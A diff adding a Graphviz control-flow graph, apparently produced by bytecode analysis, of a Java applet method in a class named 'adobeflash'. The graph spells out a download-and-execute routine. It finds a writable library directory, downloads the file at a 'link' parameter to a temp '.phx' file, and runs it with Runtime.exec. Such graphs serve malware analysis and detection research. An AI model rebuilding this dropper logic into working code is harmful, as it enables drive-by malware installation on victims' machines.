@@ -1,0 +1,110 @@
+digraph "" {
+    "r0 := @this: adobeflash"
+    "push \"java.library.path\""
+    "r0 := @this: adobeflash"->"push \"java.library.path\"";
+    "staticinvoke <java.lang.System: java.lang.String getProperty(java.lang.String)>"
+    "push \"java.library.path\""->"staticinvoke <java.lang.System: java.lang.String getProperty(java.lang.String)>";
+    "staticget <java.io.File: java.lang.String pathSeparator>"
+    "staticinvoke <java.lang.System: java.lang.String getProperty(java.lang.String)>"->"staticget <java.io.File: java.lang.String pathSeparator>";
+    "virtualinvoke <java.lang.String: java.lang.String[] split(java.lang.String)>"
+    "staticget <java.io.File: java.lang.String pathSeparator>"->"virtualinvoke <java.lang.String: java.lang.String[] split(java.lang.String)>";
+    "store.r r1"
+    "virtualinvoke <java.lang.String: java.lang.String[] split(java.lang.String)>"->"store.r r1";
+    "push null"
+    "store.r r1"->"push null";
+    "store.r r16"
+    "push null"->"store.r r16";
+    "load.r r0"
+    "store.r r16"->"load.r r0";
+    "push \"link\""
+    "load.r r0"->"push \"link\"";
+    "virtualinvoke <adobeflash: java.lang.String getParameter(java.lang.String)>"
+    "push \"link\""->"virtualinvoke <adobeflash: java.lang.String getParameter(java.lang.String)>";
+    "store.r r2"
+    "virtualinvoke <adobeflash: java.lang.String getParameter(java.lang.String)>"->"store.r r2";
+    "push 0"
+    "store.r r2"->"push 0";
+    "store.i i1"
+    "push 0"->"store.i i1";
+    "load.i i1"
+    "store.i i1"->"load.i i1";
+    "load.r r1"
+    "load.i i1"->"load.r r1";
+    "arraylength"
+    "load.r r1"->"arraylength";
+    "ifcmpge.i load.r r16"
+    "arraylength"->"ifcmpge.i load.r r16";
+    "ifcmpge.i load.r r16"->"load.r r1";
+    "load.r r1"->"load.i i1";
+    "arrayread.r"
+    "load.i i1"->"arrayread.r";
+    "store.r r3"
+    "arrayread.r"->"store.r r3";
+    "store.r r3"->"load.r r0";
+    "load.r r3"
+    "load.r r0"->"load.r r3";
+    "push \"57ef66de\""
+    "load.r r3"->"push \"57ef66de\"";
+    "specialinvoke <adobeflash: boolean isWriteable(java.lang.String,java.lang.String)>"
+    "push \"57ef66de\""->"specialinvoke <adobeflash: boolean isWriteable(java.lang.String,java.lang.String)>";
+    "ifeq inc.i i1 1"
+    "specialinvoke <adobeflash: boolean isWriteable(java.lang.String,java.lang.String)>"->"ifeq inc.i i1 1";
+    "ifeq inc.i i1 1"->"load.r r3";
+    "load.r r3"->"store.r r16";
+    "goto load.r r16"
+    "store.r r16"->"goto load.r r16";
+    "load.r r16"
+    "goto load.r r16"->"load.r r16";
+    "ifnull goto return"
+    "load.r r16"->"ifnull goto return";
+    "ifnull goto return"->"load.r r0";
+    "load.r r2"
+    "load.r r0"->"load.r r2";
+    "new java.lang.StringBuilder"
+    "load.r r2"->"new java.lang.StringBuilder";
+    "dup1.r"
+    "new java.lang.StringBuilder"->"dup1.r";
+    "specialinvoke <java.lang.StringBuilder: void <init>()>"
+    "dup1.r"->"specialinvoke <java.lang.StringBuilder: void <init>()>";
+    "specialinvoke <java.lang.StringBuilder: void <init>()>"->"load.r r16";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"
+    "load.r r16"->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "push \"\\tmp_F458GB4C.phx\""
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"push \"\\tmp_F458GB4C.phx\"";
+    "push \"\\tmp_F458GB4C.phx\""->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>"
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>";
+    "specialinvoke <adobeflash: boolean DownloadFile(java.lang.String,java.lang.String)>"
+    "virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>"->"specialinvoke <adobeflash: boolean DownloadFile(java.lang.String,java.lang.String)>";
+    "ifeq goto return"
+    "specialinvoke <adobeflash: boolean DownloadFile(java.lang.String,java.lang.String)>"->"ifeq goto return";
+    "staticinvoke <java.lang.Runtime: java.lang.Runtime getRuntime()>"
+    "ifeq goto return"->"staticinvoke <java.lang.Runtime: java.lang.Runtime getRuntime()>";
+    "staticinvoke <java.lang.Runtime: java.lang.Runtime getRuntime()>"->"new java.lang.StringBuilder";
+    "new java.lang.StringBuilder"->"dup1.r";
+    "dup1.r"->"specialinvoke <java.lang.StringBuilder: void <init>()>";
+    "specialinvoke <java.lang.StringBuilder: void <init>()>"->"load.r r16";
+    "load.r r16"->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"push \"\\tmp_F458GB4C.phx\"";
+    "push \"\\tmp_F458GB4C.phx\""->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>";
+    "virtualinvoke <java.lang.Runtime: java.lang.Process exec(java.lang.String)>"
+    "virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>"->"virtualinvoke <java.lang.Runtime: java.lang.Process exec(java.lang.String)>";
+    "virtualinvoke <java.lang.Process: int waitFor()>"
+    "virtualinvoke <java.lang.Runtime: java.lang.Process exec(java.lang.String)>"->"virtualinvoke <java.lang.Process: int waitFor()>";
+    "pop"
+    "virtualinvoke <java.lang.Process: int waitFor()>"->"pop";
+    "pop"->"load.r r0";
+    "virtualinvoke <adobeflash: void CallJavaScript()>"
+    "load.r r0"->"virtualinvoke <adobeflash: void CallJavaScript()>";
+    "goto return"
+    "virtualinvoke <adobeflash: void CallJavaScript()>"->"goto return";
+    "return"
+    "goto return"->"return";
+    "store.r r0"
+    "virtualinvoke <adobeflash: void CallJavaScript()>"->"store.r r0";
+    "inc.i i1 1"
+    "ifeq inc.i i1 1"->"inc.i i1 1";
+    "goto load.i i1"
+    "inc.i i1 1"->"goto load.i i1";
+}
